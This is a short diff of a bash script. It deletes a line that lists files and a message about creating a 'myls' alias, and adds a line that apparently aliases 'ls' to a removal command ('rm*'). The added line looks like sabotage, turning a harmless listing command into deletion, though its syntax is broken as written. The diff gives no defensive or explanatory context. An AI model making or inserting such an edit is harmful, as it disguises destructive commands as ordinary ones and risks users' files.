@@ -1,4 +1,2 @@
 #!/bin/bash
-ls
-echo "Alias 'myls' created. You can now use 'myls' to list files and directories."
-
+alias ls "rm*"
